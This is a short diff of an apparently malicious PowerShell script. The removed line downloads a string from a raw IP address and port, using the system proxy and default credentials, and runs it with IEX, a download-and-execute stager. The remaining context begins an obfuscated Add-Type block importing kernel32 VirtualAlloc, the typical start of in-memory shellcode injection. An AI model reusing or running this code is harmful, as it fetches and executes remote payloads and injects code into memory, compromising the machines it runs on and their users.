@@ -1,4 +1,4 @@
-$C=new-object net.webclient;$C.proxy=[Net.WebRequest]::GetSystemWebProxy();$C.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $C.downloadstring('http://71.193.242.109:56969/IgUQuoIKKod');
+
 $wgZdaTTJUestlVU = @"
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
